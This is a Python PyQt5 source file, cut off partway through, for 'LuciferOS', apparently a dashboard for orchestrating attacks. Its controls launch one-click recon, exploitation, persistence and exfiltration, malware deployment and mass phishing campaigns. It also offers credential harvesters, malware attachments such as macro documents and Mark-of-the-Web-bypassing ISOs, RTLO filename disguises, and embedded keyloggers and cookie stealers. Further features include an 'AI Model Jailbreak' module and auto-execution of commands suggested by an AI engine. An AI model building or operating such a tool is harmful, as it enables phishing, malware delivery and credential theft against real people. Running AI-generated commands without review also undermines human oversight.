#!/usr/bin/env python3
"""
LuciferOS - Complete Red Team Dashboard
Autonomous Attack Orchestration Interface
"""

import sys
import threading
import requests
import json
import re
import subprocess
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTextEdit, QPushButton, QLabel, QComboBox, QLineEdit, QTabWidget,
    QSpinBox, QCheckBox, QScrollArea, QFrame, QSplitter, QListWidget,
    QListWidgetItem, QMessageBox, QProgressBar, QGroupBox, QDialog,
    QShortcut, QToolBar, QAction, QStatusBar
)
from PyQt5.QtCore import Qt, QTimer, pyqtSignal
from PyQt5.QtGui import QFont, QColor, QTextCursor, QKeySequence

# Import attack mode selector
from attack_mode_selector import AttackModeSelector

class LuciferOSDashboard(QMainWindow):
    # Signals for thread-safe UI updates
    log_signal = pyqtSignal(str)
    results_signal = pyqtSignal(str)
    lilith_signal = pyqtSignal(str)
    comm_signal = pyqtSignal(str)
    command_signal = pyqtSignal(list)  # For detected commands
    status_signal = pyqtSignal(dict)   # For backend status updates
    browser_signal = pyqtSignal(dict)  # For browser status updates
    terminal_signal = pyqtSignal(str)  # For terminal output
    
    def __init__(self, attack_config=None):
        super().__init__()
        
        self.setWindowTitle("LuciferOS - Autonomous Red Team Command Center")
        # Open fullscreen for current resolution
        from PyQt5.QtWidgets import QDesktopWidget
        screen = QDesktopWidget().availableGeometry()
        self.setGeometry(screen)  # Use full available screen
        self.showMaximized()  # Start maximized
        
        # Store attack configuration
        self.attack_config = attack_config or {}
        self.attack_mode = self.attack_config.get('mode', 'remote_unauth')
        self.browser_active = False
        
        # Initialize
        self.backend_url = "http://127.0.0.1:5000"
        self.active_operations = {}
        self.scan_results = {}
        self.pending_commands = []  # Commands waiting to be executed
        self.auto_execute = False   # Auto-execute mode
        
        # Get background image path
        import os
        bg_path = os.path.join(os.path.dirname(__file__), 'luciferos_bg.png').replace('\\', '/')
        
        # Dark theme with LuciferOS branding
        dark_style = f"""
            QMainWindow {{ 
                background-image: url('{bg_path}');
                background-repeat: no-repeat;
                background-position: center;
                background-color: #000;
            }}
            QWidget {{ background-color: rgba(0, 0, 0, 0.85); color: #0f0; }}
            QTextEdit {{ background-color: rgba(10, 10, 10, 0.9); color: #0f0; border: 2px solid #f00; padding: 8px; }}
            QPushButton {{ background-color: rgba(255, 0, 0, 0.9); color: #fff; border: none; padding: 10px; font-weight: bold; }}
            QPushButton:hover {{ background-color: rgba(255, 51, 51, 0.9); }}
            QPushButton:pressed {{ background-color: rgba(204, 0, 0, 0.9); }}
            QLineEdit {{ background-color: rgba(17, 17, 17, 0.9); color: #0f0; border: 1px solid #0f0; padding: 5px; }}
            QComboBox {{ background-color: rgba(17, 17, 17, 0.9); color: #0f0; border: 1px solid #0f0; }}
            QLabel {{ color: #0f0; background-color: transparent; }}
            QSpinBox {{ background-color: rgba(17, 17, 17, 0.9); color: #0f0; border: 1px solid #0f0; }}
            QCheckBox {{ color: #0f0; }}
            QTabWidget::pane {{ background-color: rgba(0, 0, 0, 0.8); border: 1px solid #f00; }}
            QTabBar::tab {{ background-color: rgba(26, 26, 26, 0.9); color: #0f0; padding: 8px 15px; }}
            QTabBar::tab:selected {{ background-color: #f00; color: #fff; }}
            QGroupBox {{ background-color: rgba(0, 0, 0, 0.8); border: 2px solid #f00; color: #f00; }}
            QListWidget {{ background-color: rgba(10, 10, 10, 0.9); border: 1px solid #f00; }}
        """
        self.setStyleSheet(dark_style)
        
        self.init_ui()
        self.setup_keyboard_shortcuts()
        self.setup_loot_counter()
        
        # Connect signals for thread-safe UI updates
        self.log_signal.connect(self._update_log)
        self.results_signal.connect(self._update_results)
        self.lilith_signal.connect(self._update_lilith)
        self.comm_signal.connect(self._update_comm)
        self.command_signal.connect(self._update_commands)
        self.status_signal.connect(self._update_status_display)
        self.terminal_signal.connect(self._update_terminal)
        self.browser_signal.connect(self._update_browser_status)
        
        # Discover backend model configuration
        self.model = None
        threading.Thread(target=self._fetch_backend_model, daemon=True).start()
        
        # Start status polling
        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self._poll_status)
        self.status_timer.start(5000)  # Every 5 seconds
        
        # Initialize based on attack mode
        if self.attack_config:
            threading.Thread(target=self._init_attack_mode, daemon=True).start()
    
    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(20, 15, 20, 10)  # More horizontal margin
        main_layout.setSpacing(12)  # Slightly more vertical spacing
        
        # ===== HEADER =====
        header_layout = QHBoxLayout()
        
        header = QLabel("LUCIFERA - AUTONOMOUS RED TEAM COMMAND CENTER")
        header_font = QFont("Courier New", 28, QFont.Bold)
        header.setFont(header_font)
        header.setStyleSheet("color: #f00;")
        header_layout.addWidget(header)
        
        header_layout.addStretch()
        
        # Loot counter
        self.loot_label = QLabel("🍪0 🔑0 📄0")
        self.loot_label.setFont(QFont("Courier New", 12, QFont.Bold))
        self.loot_label.setStyleSheet("color: #ffcc00; padding: 5px; border: 1px solid #ffcc00; background-color: rgba(50,40,0,0.8);")
        self.loot_label.setToolTip("Loot: Cookies | Credentials | Files")
        header_layout.addWidget(self.loot_label)
        
        # Attack mode indicator
        mode_name = self.attack_config.get('mode_name', 'Not Configured')
        self.mode_indicator = QLabel(f"⚡ MODE: {mode_name}")
        self.mode_indicator.setFont(QFont("Courier New", 14, QFont.Bold))
        self.mode_indicator.setStyleSheet("color: #ff6600; padding: 5px; border: 1px solid #ff6600;")
        header_layout.addWidget(self.mode_indicator)
        
        # Browser status indicator
        self.browser_indicator = QLabel("🌐 BROWSER: OFFLINE")
        self.browser_indicator.setFont(QFont("Courier New", 12))
        self.browser_indicator.setStyleSheet("color: #666; padding: 5px;")
        header_layout.addWidget(self.browser_indicator)
        
        main_layout.addLayout(header_layout)
        
        separator = QFrame()
        separator.setFrameShape(QFrame.HLine)
        separator.setStyleSheet("color: #f00;")
        main_layout.addWidget(separator)
        
        # ===== ATTACK MODE STATUS BAR =====
        if self.attack_config.get('target'):
            target_bar = QLabel(f"🎯 TARGET: {self.attack_config.get('target')}")
            target_bar.setStyleSheet("color: #00ff00; background-color: #001a00; padding: 8px; font-family: 'Courier New';")
            main_layout.addWidget(target_bar)
        
        # ===== MAIN CONTENT - 3 PANELS =====
        content_layout = QHBoxLayout()
        content_layout.setSpacing(15)  # Space between panels
        
        # LEFT PANEL - Control Panel
        left_panel = self.create_left_panel()
        
        # CENTER PANEL - Main work area
        center_panel = self.create_center_panel()
        
        # RIGHT PANEL - Browser & Logs
        right_panel = self.create_right_panel()
        
        # Proportions: 25% left, 50% center, 25% right
        content_layout.addLayout(left_panel, 25)
        content_layout.addLayout(center_panel, 50)
        content_layout.addLayout(right_panel, 25)
        
        main_layout.addLayout(content_layout, 1)  # Stretch to fill
        
        # Status bar at bottom
        self.status_bar = QStatusBar()
        self.status_bar.setStyleSheet("color: #0f0; background-color: rgba(0,0,0,0.9);")
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready | Press F1 for help")
    
    def setup_keyboard_shortcuts(self):
        """Setup keyboard shortcuts for quick actions"""
        # F1 - Help
        QShortcut(QKeySequence("F1"), self, self.show_help)
        
        # F2 - Quick Recon
        QShortcut(QKeySequence("F2"), self, self.quick_recon)
        
        # F3 - Quick Scan  
        QShortcut(QKeySequence("F3"), self, self.analyze_target)
        
        # F4 - Generate Attack Chain
        QShortcut(QKeySequence("F4"), self, self.generate_chain)
        
        # F5 - Execute Attack
        QShortcut(QKeySequence("F5"), self, self.execute_attack)
        
        # F6 - Start Browser
        QShortcut(QKeySequence("F6"), self, self.start_browser)
        
        # F7 - Take Screenshot
        QShortcut(QKeySequence("F7"), self, self.browser_screenshot)
        
        # F8 - Extract Cookies
        QShortcut(QKeySequence("F8"), self, self.browser_extract_cookies)
        
        # Ctrl+Enter - Send LILITH message
        QShortcut(QKeySequence("Ctrl+Return"), self, self.query_lilith)
        
        # Ctrl+L - Focus LILITH input
        QShortcut(QKeySequence("Ctrl+L"), self, lambda: self.lilith_input.setFocus())
        
        # Ctrl+T - Focus Target input
        QShortcut(QKeySequence("Ctrl+T"), self, lambda: self.target_input.setFocus())
        
        # Escape - Clear all
        QShortcut(QKeySequence("Escape"), self, self.clear_all)
        
    def setup_loot_counter(self):
        """Initialize loot tracking"""
        self.loot = {
            'cookies': 0,
            'credentials': 0,
            'files': 0,
            'sessions': 0
        }
        
    def show_help(self):
        """Show keyboard shortcuts help"""
        help_text = """
🔥 LUCIFERA KEYBOARD SHORTCUTS 🔥

F1  - Show this help
F2  - Quick reconnaissance
F3  - Analyze target
F4  - Generate attack chain
F5  - Execute attack
F6  - Start browser
F7  - Take screenshot
F8  - Extract cookies

Ctrl+L - Focus LILITH input
Ctrl+T - Focus target input
Ctrl+Enter - Send LILITH message
Escape - Clear all inputs
        """
        QMessageBox.information(self, "Keyboard Shortcuts", help_text)
        
    def quick_recon(self):
        """Quick reconnaissance on target"""
        target = self.target_input.text().strip()
        if not target:
            self.status_bar.showMessage("⚠ No target specified!")
            return
        self.lilith_input.setText(f"Do a quick recon on {target} - enumerate subdomains, check common ports, identify technologies")
        self.query_lilith()
        
    def clear_all(self):
        """Clear all inputs"""
        self.lilith_input.clear()
        self.command_list.clear()
        self.status_bar.showMessage("Cleared | Press F1 for help")
        
    def update_loot_display(self):
        """Update the loot counter in header"""
        loot_text = f"🍪{self.loot['cookies']} 🔑{self.loot['credentials']} 📄{self.loot['files']}"
        if hasattr(self, 'loot_label'):
            self.loot_label.setText(loot_text)
    
    def create_left_panel(self):
        panel = QVBoxLayout()
        panel.setSpacing(8)  # Consistent vertical spacing
        
        # Make left panel scrollable for smaller screens
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll_widget = QWidget()
        scroll_layout = QVBoxLayout(scroll_widget)
        scroll_layout.setSpacing(6)
        scroll_layout.setContentsMargins(8, 8, 8, 8)
        
        # Title
        title = QLabel("CONTROL PANEL")
        title_font = QFont("Courier New", 14, QFont.Bold)
        title.setFont(title_font)
        scroll_layout.addWidget(title)
        
        # Target Input
        scroll_layout.addWidget(QLabel("TARGET:"))
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("IP, domain, or network")
        self.target_input.setMinimumWidth(300)  # Prevent truncation
        # Pre-fill from attack config
        if self.attack_config.get('target'):
            self.target_input.setText(self.attack_config.get('target'))
        scroll_layout.addWidget(self.target_input)
        
        scroll_layout.addSpacing(10)  # Visual separator
        
        # ===== ONE-CLICK AUTONOMOUS ATTACK =====
        full_pwn_btn = QPushButton("⚡ FULL AUTO ATTACK")
        full_pwn_btn.setStyleSheet("background-color: #ff0000; font-size: 16px; font-weight: bold;")
        full_pwn_btn.setMinimumHeight(50)
        full_pwn_btn.clicked.connect(self.start_autonomous_attack)
        full_pwn_btn.setToolTip("One-click: Recon → Scan → Exploit → Persist → Exfil")
        scroll_layout.addWidget(full_pwn_btn)
        
        # Chain Type Selector
        chain_layout = QHBoxLayout()
        chain_layout.addWidget(QLabel("Chain:"))
        self.chain_type = QComboBox()
        self.chain_type.addItems(["web_full", "quick_pwn", "stealth"])
        self.chain_type.setToolTip("web_full: Complete attack | quick_pwn: Fast | stealth: Slow & quiet")
        chain_layout.addWidget(self.chain_type)
        scroll_layout.addLayout(chain_layout)
        
        # Stealth Mode
        stealth_layout = QHBoxLayout()
        stealth_layout.addWidget(QLabel("Stealth:"))
        self.stealth_mode = QComboBox()
        self.stealth_mode.addItems(["aggressive", "normal", "paranoid"])
        self.stealth_mode.setCurrentText("normal")
        self.stealth_mode.setToolTip("aggressive: Fast | normal: Balanced | paranoid: Very slow, very stealthy")
        stealth_layout.addWidget(self.stealth_mode)
        scroll_layout.addLayout(stealth_layout)
        
        # Stop button
        stop_btn = QPushButton("⏹ STOP ATTACK")
        stop_btn.setStyleSheet("background-color: #660000;")
        stop_btn.clicked.connect(self.stop_autonomous_attack)
        scroll_layout.addWidget(stop_btn)
        
        # Separator
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet("color: #f00;")
        scroll_layout.addWidget(sep)
        scroll_layout.addSpacing(5)
        
        # Attack Module
        scroll_layout.addWidget(QLabel("MANUAL CONTROLS:"))
        self.attack_module = QComboBox()
        self.attack_module.addItems([
            "Full Reconnaissance",
            "Web Application Penetration",
            "Network Exploitation",
            "Privilege Escalation",
            "Lateral Movement",
            "Data Exfiltration",
            "Persistence Installation",
            "Defense Evasion",
            "AI Model Jailbreak",
            "Social Engineering",
            "Custom Attack Chain"
        ])
        scroll_layout.addWidget(self.attack_module)
        
        # Buttons
        analyze_btn = QPushButton("ANALYZE TARGET")
        analyze_btn.clicked.connect(self.analyze_target)
        scroll_layout.addWidget(analyze_btn)
        
        chain_btn = QPushButton("GENERATE CHAIN")
        chain_btn.clicked.connect(self.generate_chain)
        scroll_layout.addWidget(chain_btn)
        
        execute_btn = QPushButton("EXECUTE ATTACK")
        execute_btn.clicked.connect(self.execute_attack)
        scroll_layout.addWidget(execute_btn)
        
        scroll_layout.addSpacing(10)
        
        # Vulnerability Analysis
        scroll_layout.addWidget(QLabel("VULN ANALYSIS:"))
        
        garak_btn = QPushButton("Run Garak Scan")
        garak_btn.clicked.connect(self.run_garak)
        scroll_layout.addWidget(garak_btn)
        
        kawaii_btn = QPushButton("KawaiiGPT Analysis")
        kawaii_btn.clicked.connect(self.run_kawaii)
        scroll_layout.addWidget(kawaii_btn)
        
        scroll_layout.addSpacing(10)
        
        # Malware Deployment
        scroll_layout.addWidget(QLabel("MALWARE DEPLOYMENT:"))
        self.malware_type = QComboBox()
        self.malware_type.addItems([
            "Virus",
            "Worm", 
            "Trojan",
            "PUP",
            "Malware",
            "Adware",
            "DDoS",
            "Remote Access",
            "System Overload"
        ])
        scroll_layout.addWidget(self.malware_type)
        
        deploy_malware_btn = QPushButton("DEPLOY MALWARE")
        deploy_malware_btn.clicked.connect(self.deploy_malware)
        deploy_malware_btn.setMinimumHeight(40)
        scroll_layout.addWidget(deploy_malware_btn)
        
        scroll_layout.addSpacing(10)
        
        # Advanced Attacks
        scroll_layout.addWidget(QLabel("ADVANCED ATTACKS:"))
        self.advanced_attack_type = QComboBox()
        self.advanced_attack_type.addItems([
            "Availability Attack",
            "Identity & Access Abuse",
            "Living-off-the-land Abuse",
            "Persistence Mechanisms",
            "Covert Command & Control",
            "Data Exfiltration",
            "Lateral Movement",
            "Radio/Peripheral Abuse",
            "Resource Exploitation",
            "Human-layer Attacks",
            "Supply-chain Abuse",
            "AI-accelerated Variants"
        ])
        scroll_layout.addWidget(self.advanced_attack_type)
        
        deploy_advanced_btn = QPushButton("DEPLOY ADVANCED ATTACK")
        deploy_advanced_btn.clicked.connect(self.deploy_advanced_attack)
        deploy_advanced_btn.setMinimumHeight(40)
        scroll_layout.addWidget(deploy_advanced_btn)
        
        scroll_layout.addSpacing(10)
        
        # AI-Powered Attacks
        scroll_layout.addWidget(QLabel("AI-POWERED ATTACKS:"))
        
        ai_recommend_btn = QPushButton("GET AI RECOMMENDATION")
        ai_recommend_btn.clicked.connect(self.get_ai_recommendation)
        ai_recommend_btn.setMinimumHeight(40)
        scroll_layout.addWidget(ai_recommend_btn)
        
        deploy_ai_btn = QPushButton("DEPLOY AI ATTACK")
        deploy_ai_btn.clicked.connect(self.deploy_ai_attack)
        deploy_ai_btn.setMinimumHeight(40)
        scroll_layout.addWidget(deploy_ai_btn)
        
        scroll_layout.addSpacing(10)
        
        # AutoGPT Loop
        scroll_layout.addWidget(QLabel("AUTOGPT AUTONOMOUS MODE:"))
        
        autogpt_btn = QPushButton("START AUTOGPT LOOP")
        autogpt_btn.clicked.connect(self.start_autogpt_loop)
        autogpt_btn.setMinimumHeight(40)
        scroll_layout.addWidget(autogpt_btn)
        
        scroll_layout.addStretch()
        
        # Finalize scroll area
        scroll.setWidget(scroll_widget)
        scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        panel.addWidget(scroll)
        
        return panel
    
    def create_center_panel(self):
        panel = QVBoxLayout()
        
        tabs = QTabWidget()
        
        # LILITH Tab
        lilith_tab = QWidget()
        lilith_layout = QVBoxLayout(lilith_tab)
        
        # Status bar for LILITH
        lilith_status_layout = QHBoxLayout()
        lilith_status_layout.addWidget(QLabel("LILITH - AUTONOMOUS REASONING ENGINE"))
        lilith_status_layout.addStretch()
        self.lilith_status_label = QLabel("● OFFLINE")
        self.lilith_status_label.setStyleSheet("color: #ff0000; font-weight: bold;")
        lilith_status_layout.addWidget(self.lilith_status_label)
        lilith_layout.addLayout(lilith_status_layout)
        
        self.lilith_output = QTextEdit()
        self.lilith_output.setReadOnly(True)
        lilith_layout.addWidget(self.lilith_output)
        
        # Input with send button
        input_layout = QHBoxLayout()
        self.lilith_input = QLineEdit()
        self.lilith_input.setPlaceholderText("Ask LILITH for recon, exploits, commands...")
        self.lilith_input.returnPressed.connect(self.query_lilith)
        input_layout.addWidget(self.lilith_input)
        
        send_btn = QPushButton("SEND")
        send_btn.clicked.connect(self.query_lilith)
        send_btn.setMaximumWidth(80)
        input_layout.addWidget(send_btn)
        lilith_layout.addLayout(input_layout)
        
        # Command Queue section
        cmd_group = QGroupBox("DETECTED COMMANDS")
        cmd_layout = QVBoxLayout(cmd_group)
        
        self.command_list = QListWidget()
        self.command_list.setMaximumHeight(120)
        self.command_list.setStyleSheet("QListWidget { background-color: #1a0000; border: 1px solid #ff0000; }")
        cmd_layout.addWidget(self.command_list)
        
        cmd_btn_layout = QHBoxLayout()
        exec_selected_btn = QPushButton("EXECUTE SELECTED")
        exec_selected_btn.clicked.connect(self.execute_selected_command)
        cmd_btn_layout.addWidget(exec_selected_btn)
        
        exec_all_btn = QPushButton("EXECUTE ALL")
        exec_all_btn.clicked.connect(self.execute_all_commands)
        cmd_btn_layout.addWidget(exec_all_btn)
        
        clear_cmd_btn = QPushButton("CLEAR")
        clear_cmd_btn.clicked.connect(lambda: self.command_list.clear())
        clear_cmd_btn.setMaximumWidth(60)
        cmd_btn_layout.addWidget(clear_cmd_btn)
        
        cmd_layout.addLayout(cmd_btn_layout)
        
        # Auto-execute toggle
        auto_layout = QHBoxLayout()
        self.auto_execute_checkbox = QCheckBox("Auto-Execute Commands")
        self.auto_execute_checkbox.setStyleSheet("color: #ff6600;")
        self.auto_execute_checkbox.stateChanged.connect(self._toggle_auto_execute)
        auto_layout.addWidget(self.auto_execute_checkbox)
        auto_layout.addStretch()
        cmd_layout.addLayout(auto_layout)
        
        lilith_layout.addWidget(cmd_group)
        
        tabs.addTab(lilith_tab, "LILITH")
        
        # Attack Results Tab
        results_tab = QWidget()
        results_layout = QVBoxLayout(results_tab)
        results_layout.addWidget(QLabel("ATTACK RESULTS"))
        
        self.results_display = QTextEdit()
        self.results_display.setReadOnly(True)
        results_layout.addWidget(self.results_display)
        
        tabs.addTab(results_tab, "Results")
        
        # Terminal Output Tab
        terminal_tab = QWidget()
        terminal_layout = QVBoxLayout(terminal_tab)
        terminal_layout.addWidget(QLabel("COMMAND OUTPUT"))
        
        self.terminal_display = QTextEdit()
        self.terminal_display.setReadOnly(True)
        self.terminal_display.setStyleSheet("QTextEdit { background-color: #000; color: #0f0; font-family: 'Courier New'; }")
        terminal_layout.addWidget(self.terminal_display)
        
        # Direct command input
        direct_cmd_layout = QHBoxLayout()
        self.direct_cmd_input = QLineEdit()
        self.direct_cmd_input.setPlaceholderText("Enter command to execute directly...")
        self.direct_cmd_input.returnPressed.connect(self.execute_direct_command)
        direct_cmd_layout.addWidget(self.direct_cmd_input)
        
        run_btn = QPushButton("RUN")
        run_btn.clicked.connect(self.execute_direct_command)
        run_btn.setMaximumWidth(60)
        direct_cmd_layout.addWidget(run_btn)
        terminal_layout.addLayout(direct_cmd_layout)
        
        tabs.addTab(terminal_tab, "Terminal")
        
        # Communication Tab
        comm_tab = QWidget()
        comm_layout = QVBoxLayout(comm_tab)
        comm_layout.addWidget(QLabel("COMMUNICATION GENERATOR"))
        
        self.comm_display = QTextEdit()
        self.comm_display.setReadOnly(True)
        comm_layout.addWidget(self.comm_display)
        
        comm_btn = QPushButton("Generate Social Engineering Template")
        comm_btn.clicked.connect(self.generate_communication)
        comm_layout.addWidget(comm_btn)
        
        tabs.addTab(comm_tab, "Communications")
        
        # ===== EMAIL PHISHING TAB =====
        email_tab = QWidget()
        email_main_layout = QVBoxLayout(email_tab)
        email_main_layout.setContentsMargins(0, 0, 0, 0)
        
        # Make phishing tab scrollable
        email_scroll = QScrollArea()
        email_scroll.setWidgetResizable(True)
        email_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        email_scroll.setStyleSheet("QScrollArea { border: none; }")
        
        email_scroll_widget = QWidget()
        email_layout = QVBoxLayout(email_scroll_widget)
        email_layout.setSpacing(10)  # Good spacing between groups
        email_layout.setContentsMargins(10, 10, 10, 10)
        
        # Email Account Section
        email_acct_group = QGroupBox("EMAIL ACCOUNT")
        email_acct_layout = QVBoxLayout(email_acct_group)
        email_acct_layout.setSpacing(8)
        
        # Quick disposable email
        disp_btn = QPushButton("GET DISPOSABLE EMAIL (No Signup)")
        disp_btn.clicked.connect(self.get_disposable_email)
        disp_btn.setStyleSheet("background-color: #006600;")
        email_acct_layout.addWidget(disp_btn)
        
        # Current email display
        self.current_email_label = QLabel("Current: Not logged in")
        self.current_email_label.setStyleSheet("color: #ffcc00; padding: 5px;")
        email_acct_layout.addWidget(self.current_email_label)
        
        email_layout.addWidget(email_acct_group)
        
        # Phishing Composer Section
        phish_group = QGroupBox("PHISHING COMPOSER")
        phish_layout = QVBoxLayout(phish_group)
        phish_layout.setSpacing(8)
        
        # Target email
        target_row = QHBoxLayout()
        target_row.addWidget(QLabel("To:"))
        self.phish_to = QLineEdit()
        self.phish_to.setPlaceholderText("target@victim.com")
        self.phish_to.setMinimumWidth(300)
        target_row.addWidget(self.phish_to)
        phish_layout.addLayout(target_row)
        
        # Template selector
        template_row = QHBoxLayout()
        template_row.addWidget(QLabel("Template:"))
        self.phish_template = QComboBox()
        self.phish_template.addItems([
            "password_reset",
            "invoice",
            "document_share",
            "account_verification",
            "delivery_notification",
            "it_support"
        ])
        self.phish_template.setToolTip("Pre-built phishing templates")
        template_row.addWidget(self.phish_template)
        phish_layout.addLayout(template_row)
        
        # Attack URL
        attack_row = QHBoxLayout()
        attack_row.addWidget(QLabel("Attack URL:"))
        self.phish_attack_url = QLineEdit()
        self.phish_attack_url.setPlaceholderText("http://your-phishing-server/harvest")
        self.phish_attack_url.setMinimumWidth(300)
        attack_row.addWidget(self.phish_attack_url)
        phish_layout.addLayout(attack_row)
        
        # Auto-setup buttons row
        auto_row = QHBoxLayout()
        
        # Create credential harvester button
        cred_btn = QPushButton("CREATE HARVESTER")
        cred_btn.clicked.connect(self.create_credential_harvester)
        cred_btn.setToolTip("Generate a fake login page that captures credentials")
        cred_btn.setStyleSheet("background-color: #444400;")
        auto_row.addWidget(cred_btn)
        
        # Full campaign button
        full_campaign_btn = QPushButton("⚡ FULL CAMPAIGN SETUP")
        full_campaign_btn.clicked.connect(self.create_full_campaign)
        full_campaign_btn.setToolTip("One-click: Create harvester + malware + fill all URLs")
        full_campaign_btn.setStyleSheet("background-color: #660066; font-weight: bold;")
        auto_row.addWidget(full_campaign_btn)
        
        phish_layout.addLayout(auto_row)
        
        # Send buttons
        phish_btn_row = QHBoxLayout()
        
        send_phish_btn = QPushButton("SEND PHISHING EMAIL")
        send_phish_btn.clicked.connect(self.send_phishing_email)
        send_phish_btn.setStyleSheet("background-color: #990000; font-weight: bold;")
        phish_btn_row.addWidget(send_phish_btn)
        
        preview_btn = QPushButton("PREVIEW")
        preview_btn.clicked.connect(self.preview_phishing_email)
        preview_btn.setMaximumWidth(80)
        phish_btn_row.addWidget(preview_btn)
        
        phish_layout.addLayout(phish_btn_row)
        
        email_layout.addWidget(phish_group)
        
        # Mass Phishing Section
        mass_group = QGroupBox("MASS PHISHING CAMPAIGN")
        mass_layout = QVBoxLayout(mass_group)
        
        mass_targets_row = QHBoxLayout()
        mass_targets_row.addWidget(QLabel("Targets:"))
        self.mass_phish_targets = QLineEdit()
        self.mass_phish_targets.setPlaceholderText("email1@a.com, email2@b.com, email3@c.com")
        self.mass_phish_targets.setMinimumWidth(300)
        mass_targets_row.addWidget(self.mass_phish_targets)
        mass_layout.addLayout(mass_targets_row)
        
        mass_launch_btn = QPushButton("LAUNCH MASS CAMPAIGN")
        mass_launch_btn.clicked.connect(self.launch_mass_phishing)
        mass_launch_btn.setStyleSheet("background-color: #660000; font-weight: bold;")
        mass_layout.addWidget(mass_launch_btn)
        
        email_layout.addWidget(mass_group)
        
        # ===== MALWARE ATTACHMENT SECTION =====
        malware_group = QGroupBox("MALWARE ATTACHMENT")
        malware_group.setStyleSheet("QGroupBox { border: 2px solid #ff6600; color: #ff6600; font-weight: bold; }")
        malware_layout = QVBoxLayout(malware_group)
        
        # Malware type selector
        malware_type_row = QHBoxLayout()
        malware_type_row.addWidget(QLabel("Type:"))
        self.malware_type_combo = QComboBox()
        self.malware_type_combo.addItems([
            "macro_doc",      # Word doc with macro
            "hta",            # HTML Application
            "js",             # JavaScript (WSH)
            "vbs",            # VBScript
            "bat",            # Batch file
            "ps1",            # PowerShell script
            "html_smuggle",   # HTML smuggling
            "iso",            # ISO container (bypasses MOTW)
            "zip",            # ZIP archive
        ])
        self.malware_type_combo.setToolTip(
            "macro_doc: Word macro | hta: HTML App | js/vbs: Scripts | "
            "bat/ps1: Command scripts | html_smuggle: Browser delivery | "
            "iso: Bypasses Mark-of-Web | zip: Archive"
        )
        malware_type_row.addWidget(self.malware_type_combo)
        malware_layout.addLayout(malware_type_row)
        
        # Payload URL (for droppers)
        payload_url_row = QHBoxLayout()
        payload_url_row.addWidget(QLabel("Payload URL:"))
        self.malware_payload_url = QLineEdit()
        self.malware_payload_url.setPlaceholderText("http://your-server/payload.exe")
        self.malware_payload_url.setMinimumWidth(250)
        payload_url_row.addWidget(self.malware_payload_url)
        malware_layout.addLayout(payload_url_row)
        
        # Generate and preview buttons
        malware_btn_row = QHBoxLayout()
        
        generate_malware_btn = QPushButton("GENERATE MALWARE")
        generate_malware_btn.clicked.connect(self.generate_malware)
        generate_malware_btn.setStyleSheet("background-color: #663300;")
        malware_btn_row.addWidget(generate_malware_btn)
        
        send_malware_btn = QPushButton("SEND WITH MALWARE")
        send_malware_btn.clicked.connect(self.send_malware_email)
        send_malware_btn.setStyleSheet("background-color: #990000; font-weight: bold;")
        malware_btn_row.addWidget(send_malware_btn)
        
        malware_layout.addLayout(malware_btn_row)
        
        # Filename obfuscation
        obfuscate_row = QHBoxLayout()
        obfuscate_row.addWidget(QLabel("Obfuscate:"))
        self.obfuscate_method = QComboBox()
        self.obfuscate_method.addItems(["none", "rtlo", "double_ext", "spaces"])
        self.obfuscate_method.setToolTip(
            "rtlo: Unicode right-to-left trick | double_ext: file.pdf.exe | spaces: hide extension"
        )
        obfuscate_row.addWidget(self.obfuscate_method)
        malware_layout.addLayout(obfuscate_row)
        
        email_layout.addWidget(malware_group)
        
        # Payload Embedding Section
        payload_group = QGroupBox("PAYLOAD EMBEDDING")
        payload_layout = QVBoxLayout(payload_group)
        
        payload_type_row = QHBoxLayout()
        payload_type_row.addWidget(QLabel("Payload:"))
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "tracking_pixel",
            "keylogger",
            "form_stealer",
            "cookie_stealer",
            "credential_phish",
            "session_hijack"
        ])
        payload_type_row.addWidget(self.payload_type)
        payload_layout.addLayout(payload_type_row)
        
        embed_btn = QPushButton("EMBED PAYLOAD IN EMAIL")
        embed_btn.clicked.connect(self.embed_payload)
        embed_btn.setToolTip("Add hidden payload to composed email")
        payload_layout.addWidget(embed_btn)
        
        email_layout.addWidget(payload_group)
        
        # Collection Stats
        stats_group = QGroupBox("HARVEST STATS")
        stats_layout = QHBoxLayout(stats_group)
        
        self.harvest_stats_label = QLabel("Opens: 0 | Credentials: 0 | Data: 0")
        self.harvest_stats_label.setStyleSheet("color: #00ff00;")
        stats_layout.addWidget(self.harvest_stats_label)
        
        refresh_stats_btn = QPushButton("REFRESH")
        refresh_stats_btn.clicked.connect(self.refresh_harvest_stats)
        refresh_stats_btn.setMaximumWidth(80)
        stats_layout.addWidget(refresh_stats_btn)
        
        email_layout.addWidget(stats_group)
        
        # Email output display
        self.email_output = QTextEdit()
        self.email_output.setReadOnly(True)
        self.email_output.setMaximumHeight(150)
        self.email_output.setPlaceholderText("Email operation results will appear here...")
        email_layout.addWidget(self.email_output)
        
        email_layout.addStretch()  # Push content to top
        
        # Finalize scroll area
        email_scroll.setWidget(email_scroll_widget)
        email_main_layout.addWidget(email_scroll)
        
        tabs.addTab(email_tab, "📧 Phishing")
        
        panel.addWidget(tabs)
        return panel
    
    def create_right_panel(self):
        panel = QVBoxLayout()
        panel.setSpacing(10)  # Consistent spacing
        
        # ===== BROWSER CONTROL =====
        browser_group = QGroupBox("🌐 BROWSER CONTROL")
        browser_group.setStyleSheet("QGroupBox { border: 2px solid #00ff00; color: #00ff00; font-weight: bold; }")
        browser_layout = QVBoxLayout(browser_group)
        browser_layout.setSpacing(8)
        
        # Browser status
        self.browser_status_label = QLabel("Status: Not Started")
        self.browser_status_label.setStyleSheet("color: #666;")
        browser_layout.addWidget(self.browser_status_label)
        
        # Browser buttons row 1
        browser_btn_row1 = QHBoxLayout()
        
        self.browser_start_btn = QPushButton("▶ START")
        self.browser_start_btn.clicked.connect(self.start_browser)
        self.browser_start_btn.setStyleSheet("background-color: #006600;")
        browser_btn_row1.addWidget(self.browser_start_btn)
        
